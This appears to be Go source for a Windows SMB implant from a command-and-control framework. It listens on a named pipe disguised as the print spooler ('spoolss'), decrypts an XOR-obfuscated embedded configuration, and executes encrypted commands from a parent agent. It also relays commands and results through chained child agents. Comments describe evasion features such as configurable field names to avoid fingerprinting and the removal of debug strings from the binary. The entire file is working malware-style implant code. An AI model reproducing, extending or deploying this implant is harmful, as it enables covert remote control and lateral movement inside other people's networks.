// server/docker/payloads/SMB_Windows/main.go
// SMB-based Windows agent that communicates via named pipes

//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"log"
	"os"
	"os/signal"
	"syscall"
	"time"
)

// getPayloadKeys returns the keys in a payload map for debug logging
func getPayloadKeys(m map[string]interface{}) []string {
	keys := make([]string, 0, len(m))
	for k := range m {
		keys = append(keys, k)
	}
	return keys
}

// Configuration variables - will be replaced at compile time via -ldflags
var (
	// XOR key for decrypting embedded values (same pattern as HTTPS agent)
	xorKey = ""

	// Embedded encrypted configuration blob (XOR encrypted with decrypted secret)
	encryptedConfig = ""

	// Initial client ID from build
	clientID = ""

	// Current sleep interval (seconds) and jitter (percentage)
	sleep  = "30"
	jitter = "10"

	// Secret for encryption (XOR encrypted with xorKey, decrypted at runtime)
	secret = ""

	// Pipe name for the named pipe listener
	pipeName = "spoolss"

	// SMB pipe transforms - embedded at build time, XOR encrypted with xorKey
	// When empty, no transforms are applied (legacy mode)
	smbDataTransforms = ""

	// Malleable link field names - injected at build time via ldflags
	// These can be customized in config.toml to avoid structural fingerprinting
	MALLEABLE_LINK_DATA_FIELD           = "ld"
	MALLEABLE_LINK_COMMANDS_FIELD       = "lc"
	MALLEABLE_LINK_HANDSHAKE_FIELD      = "lh"
	MALLEABLE_LINK_HANDSHAKE_RESP_FIELD = "lr"
	MALLEABLE_LINK_UNLINK_FIELD         = "lu"
	MALLEABLE_ROUTING_ID_FIELD          = "r"
	MALLEABLE_PAYLOAD_FIELD             = "p"
)

// Parsed SMB transforms - initialized on first use
var parsedSMBTransforms *SMBDataBlock

// Global managers
var (
	pipeListener  *PipeListener
	commandQueue  *CommandQueue
	resultManager *ResultManager
	secureComms   *SecureComms
)

// Track transform padding lengths for current connection
// These are stored when receiving data and used when sending response
var currentPrependLen, currentAppendLen int

func init() {
	// Parse embedded SMB transforms if configured
	if smbDataTransforms != "" && xorKey != "" {
		// First Base64 decode, then XOR decrypt (matches server-side encryption)
		decoded, err := base64.StdEncoding.DecodeString(smbDataTransforms)
		if err != nil {
			return
		}
		// Decrypt the transforms data using xorKey
		decrypted := xorDecryptBytes(decoded, []byte(xorKey))
		parsedSMBTransforms = parseSMBDataBlock(string(decrypted))
	}
}

// xorDecryptBytes decrypts data using XOR with key
func xorDecryptBytes(data, key []byte) []byte {
	if len(key) == 0 {
		return data
	}
	result := make([]byte, len(data))
	for i, b := range data {
		result[i] = b ^ key[i%len(key)]
	}
	return result
}

func main() {
	// Decrypt embedded configuration
	config, err := decryptConfig(encryptedConfig)
	if err != nil {
		os.Exit(1)
	}

	// Initialize command queue and result manager
	commandQueue = NewCommandQueue()
	resultManager = NewResultManager()

	// Create the named pipe listener using the global pipeName variable
	// (set via ldflags during build, defaults to "spoolss")
	activePipeName := pipeName
	if configPipe, ok := config["Pipe Name"]; ok && configPipe != "" {
		activePipeName = configPipe // Override with config if present
	}

	pipeListener, err = NewPipeListener(activePipeName)
	if err != nil {
		os.Exit(1)
	}

	// Handle shutdown gracefully
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigChan
		pipeListener.Close()
		os.Exit(0)
	}()

	// Main loop - wait for connections from HTTPS agents
	for {
		conn, err := pipeListener.Accept()
		if err != nil {
			time.Sleep(time.Second)
			continue
		}

		// Handle connection in a goroutine
		go handleConnection(conn, config)
	}
}

func handleConnection(conn *PipeConnection, config map[string]string) {
	defer conn.Close()

	// Perform authentication with the connecting HTTPS agent
	if err := performAuth(conn); err != nil {
		return
	}

	// Always perform handshake for each new connection
	// Even if we already have clientID/keys, the connecting HTTPS agent needs
	// to receive our handshake data to complete the link
	if err := performHandshake(conn, config); err != nil {
		return
	}

	// Main message loop
	for {
		// Read message from HTTPS agent
		rawMessage, err := conn.ReadMessage()
		if err != nil {
			return
		}

		// Try to parse as legacy JSON format first
		var msgEnvelope struct {
			Type    string `json:"type"`
			Payload string `json:"payload"`
		}

		var messageData []byte
		var isTransformed bool

		if err := json.Unmarshal(rawMessage, &msgEnvelope); err == nil && msgEnvelope.Type != "" {
			// Successfully parsed as JSON with type field - legacy format
			isTransformed = false
			messageData = rawMessage
		} else if parsedSMBTransforms != nil && len(parsedSMBTransforms.Transforms) > 0 {
			// Not valid legacy JSON and we have transforms configured
			// Assume it's transformed data - reverse transforms to get JSON envelope
			reversed, err := reverseSMBTransforms(rawMessage, parsedSMBTransforms.Transforms, currentPrependLen, currentAppendLen)
			if err != nil {
				continue
			}

			// Parse the reversed data as JSON envelope
			if err := json.Unmarshal(reversed, &msgEnvelope); err != nil {
				continue
			}
			isTransformed = true
			messageData = reversed
		} else {
			// No transforms configured and not valid JSON - skip
			continue
		}

		// Store transform mode for response handling
		_ = isTransformed // May be used later for response handling

		switch msgEnvelope.Type {
		case "data":
			handleServerData(conn, msgEnvelope.Payload)

		case "handshake_response":
			handleHandshakeResponse(conn, rawMessage)

		case "link_handshake_response":
			// This is a forwarded handshake response for a child agent
			handleLinkHandshakeResponse(messageData)

		case "ping":
			// Heartbeat from parent - respond with pong to keep connection alive
			sendPong(conn)

		case "disconnect":
			return
		}

		_ = messageData // Suppress unused warning
	}
}

func handleServerData(conn *PipeConnection, encryptedPayload string) {
	if secureComms == nil {
		return
	}

	// Decrypt the payload
	decrypted, err := secureComms.DecryptMessage(encryptedPayload)
	if err != nil {
		return
	}

	// Parse as JSON to check for nested link commands
	var payloadData map[string]interface{}
	if err := json.Unmarshal([]byte(decrypted), &payloadData); err != nil {
		// Legacy format - just commands array
		if err := commandQueue.AddCommands(decrypted); err != nil {
			return
		}
	} else {
		// New format - may have commands and/or link data

		// Process handshake responses for child agents FIRST (before commands)
		if linkRespVal, ok := payloadData[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD]; ok {
			if linkRespData, ok := linkRespVal.([]interface{}); ok {
				processLinkHandshakeResponses(linkRespData)
			}
		}

		// Process link commands for child agents (forward to linked SMB agents)
		if linkCmdsVal, ok := payloadData[MALLEABLE_LINK_COMMANDS_FIELD]; ok {
			if linkCmdsData, ok := linkCmdsVal.([]interface{}); ok {
				processLinkCommands(linkCmdsData)
			}
		}

		// Extract commands array if present
		if cmdsVal, ok := payloadData["commands"]; ok {
			cmdsJSON, err := json.Marshal(cmdsVal)
			if err == nil {
				commandQueue.AddCommands(string(cmdsJSON))
			}
		}
	}

	// Process commands
	for {
		result, err := commandQueue.ProcessNextCommand()
		if err != nil {
			continue
		}
		if result == nil {
			break
		}
		// Add result to manager
		resultManager.AddResult(result)
	}

	// Collect link data from child agents (SMB or TCP)
	lm := GetLinkManager()
	linkData := lm.GetOutboundData()
	linkHandshake := lm.GetHandshakeData()
	unlinkNotifications := lm.GetUnlinkNotifications()

	log.Printf("[LINK] Collected from children: linkData=%d, linkHandshake=%v, unlinkNotifications=%d",
		len(linkData), linkHandshake != nil, len(unlinkNotifications))
	for i, ld := range linkData {
		log.Printf("[LINK] LinkData[%d]: routingID=%s, payloadLen=%d", i, ld.RoutingID, len(ld.Payload))
	}

	hasResults := resultManager.HasResults()
	hasLinkData := len(linkData) > 0
	hasLinkHandshake := linkHandshake != nil
	hasUnlinkNotifications := len(unlinkNotifications) > 0

	// Send results back (including any link data from child agents)
	if hasResults || hasLinkData || hasLinkHandshake || hasUnlinkNotifications {
		results := resultManager.GetPendingResults()
		log.Printf("[LINK] Building response: results=%d, linkData=%d, hasHandshake=%v, unlinkNotifications=%d",
			len(results), len(linkData), hasLinkHandshake, len(unlinkNotifications))

		payload := map[string]interface{}{
			"agent_id": clientID,
		}

		if len(results) > 0 {
			payload["results"] = results
		}

		// Include link data from child agents (to be forwarded up the chain)
		if hasLinkData {
			log.Printf("[LINK] Including %d link data items in response (field: %s)", len(linkData), MALLEABLE_LINK_DATA_FIELD)
			payload[MALLEABLE_LINK_DATA_FIELD] = ConvertLinkDataToMaps(linkData)
		}

		// Include link handshake from child agents
		if hasLinkHandshake {
			payload[MALLEABLE_LINK_HANDSHAKE_FIELD] = linkHandshake.ToMalleableMap()
		}

		// Include unlink notifications from child agents
		if hasUnlinkNotifications {
			payload[MALLEABLE_LINK_UNLINK_FIELD] = unlinkNotifications
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			return
		}

		// Encrypt with our secret
		encrypted, err := secureComms.EncryptMessage(string(jsonData))
		if err != nil {
			log.Printf("[LINK] EncryptMessage failed: %v", err)
			return
		}

		// Send back through pipe with transforms if configured
		log.Printf("[LINK] Sending response to parent: payloadLen=%d", len(encrypted))
		if err := sendPipeResponse(conn, encrypted); err != nil {
			log.Printf("[LINK] sendPipeResponse FAILED: %v", err)
			return
		}
		log.Printf("[LINK] Successfully sent response to parent")

		// Rotate secret
		secureComms.RotateSecret()
	} else {
		// Still need to send an empty response so parent knows we're done
		emptyPayload := map[string]interface{}{
			"agent_id": clientID,
		}
		jsonData, _ := json.Marshal(emptyPayload)
		encrypted, err := secureComms.EncryptMessage(string(jsonData))
		if err != nil {
			log.Printf("[LINK] EncryptMessage (empty) failed: %v", err)
			return
		}
		log.Printf("[LINK] Sending empty response to parent")
		if err := sendPipeResponse(conn, encrypted); err != nil {
			log.Printf("[LINK] sendPipeResponse (empty) FAILED: %v", err)
			return
		}
		log.Printf("[LINK] Successfully sent empty response to parent")
		secureComms.RotateSecret()
	}
}

// sendPipeResponse sends a response through the pipe
// NOTE: Transforms are NOT applied for parent-agent responses because the parent
// agent doesn't have this agent's transforms and can't reverse them.
// Transforms are only meant for HTTP server communication, not inter-agent links.
func sendPipeResponse(conn *PipeConnection, encryptedPayload string) error {
	// Create JSON envelope
	response := map[string]string{
		"type":    "data",
		"payload": encryptedPayload,
	}
	respJSON, err := json.Marshal(response)
	if err != nil {
		return err
	}

	// Write JSON directly - no transforms for parent-agent communication
	return conn.WriteMessage(respJSON)
}

func handleHandshakeResponse(conn *PipeConnection, rawMessage []byte) {
	// This is called when we receive a handshake response from the server
	// For the SMB agent's own handshake, performHandshake handles it directly
	// But this function is called from the message loop for forwarded responses

	// Parse into map to support configurable field names
	var msgMap map[string]interface{}
	if err := json.Unmarshal(rawMessage, &msgMap); err != nil {
		return
	}

	// If there's lr data, forward to our children using configurable field name
	if lrData, ok := msgMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD].([]interface{}); ok && len(lrData) > 0 {
		processLinkHandshakeResponses(lrData)
	}
}

// handleLinkHandshakeResponse handles forwarded handshake responses from parent
// This is used when a grandchild agent's handshake response needs to pass through us
func handleLinkHandshakeResponse(rawMessage []byte) {
	// Parse into map to support configurable field names
	var msgMap map[string]interface{}
	if err := json.Unmarshal(rawMessage, &msgMap); err != nil {
		return
	}

	// Extract handshake responses using configurable field name
	lrData, ok := msgMap[MALLEABLE_LINK_HANDSHAKE_RESP_FIELD].([]interface{})
	if !ok || len(lrData) == 0 {
		return
	}

	// Process the lr data - forward to our children
	processLinkHandshakeResponses(lrData)
}

// logDebug removed to eliminate debug strings from binary
// func logDebug(format string, v ...interface{}) {
// 	if debugMode == "true" {
// 		log.Printf(format, v...)
// 	}
// }

// processLinkCommands forwards commands from parent to linked (child) agents
// and waits for responses synchronously so they can be included in the same response cycle
func processLinkCommands(linkCmds []interface{}) {
	lm := GetLinkManager()

	log.Printf("[LINK] processLinkCommands: processing %d link commands", len(linkCmds))

	for _, cmd := range linkCmds {
		cmdMap, ok := cmd.(map[string]interface{})
		if !ok {
			continue
		}

		routingID, _ := cmdMap[MALLEABLE_ROUTING_ID_FIELD].(string)
		payload, _ := cmdMap[MALLEABLE_PAYLOAD_FIELD].(string)
		// Check if payload has transforms applied by server (t=true means raw bytes after base64 decode)
		transformed, _ := cmdMap["t"].(bool)

		if routingID == "" || payload == "" {
			log.Printf("[LINK] Skipping invalid link command: routingID=%s, payloadLen=%d", routingID, len(payload))
			continue
		}

		log.Printf("[LINK] Forwarding command to routingID=%s, payloadLen=%d, transformed=%v", routingID, len(payload), transformed)

		// Forward to the linked agent AND WAIT for response
		// If transformed=true, payload is base64-encoded transformed data - send as raw bytes
		response, err := lm.ForwardToLinkedAgentAndWait(routingID, payload, transformed, 30*time.Second)
		if err != nil {
			log.Printf("[LINK] ForwardToLinkedAgentAndWait error for routingID=%s: %v", routingID, err)
			continue
		}

		if response == nil {
			log.Printf("[LINK] ForwardToLinkedAgentAndWait returned nil response for routingID=%s (timeout?)", routingID)
			continue
		}

		log.Printf("[LINK] Got response from routingID=%s, payloadLen=%d", routingID, len(response.Payload))
		// Queue the response for sending back to parent
		lm.queueOutboundData(response)
	}
}

// processLinkHandshakeResponses forwards handshake responses from parent to child agents
// The response is sent as handshake_response which the child can use directly OR forward to grandchildren
func processLinkHandshakeResponses(linkResps []interface{}) {
	lm := GetLinkManager()

	for _, resp := range linkResps {
		respMap, ok := resp.(map[string]interface{})
		if !ok {
			continue
		}

		routingID, _ := respMap[MALLEABLE_ROUTING_ID_FIELD].(string)
		payload, _ := respMap[MALLEABLE_PAYLOAD_FIELD].(string)

		if routingID == "" || payload == "" {
			continue
		}

		// Get the link
		link, exists := lm.GetLink(routingID)
		if !exists {
			continue
		}

		// Send handshake_response to the child
		// Include the full lr data so the child can forward to grandchildren if needed
		message := map[string]interface{}{
			"type":                                "handshake_response",
			"payload":                             payload,
			MALLEABLE_LINK_HANDSHAKE_RESP_FIELD:   []interface{}{respMap}, // Include lr for forwarding to grandchildren
		}

		msgJSON, err := json.Marshal(message)
		if err != nil {
			continue
		}

		link.mu.Lock()
		writeMessage(link.Conn, msgJSON)
		link.mu.Unlock()

		// Brief pause to let child process handshake before commands arrive
		time.Sleep(100 * time.Millisecond)
	}
}

// sendPong sends a pong response to the parent agent
func sendPong(conn *PipeConnection) {
	response := map[string]string{
		"type": "pong",
	}
	respJSON, err := json.Marshal(response)
	if err != nil {
		return
	}

	conn.WriteMessage(respJSON)
}
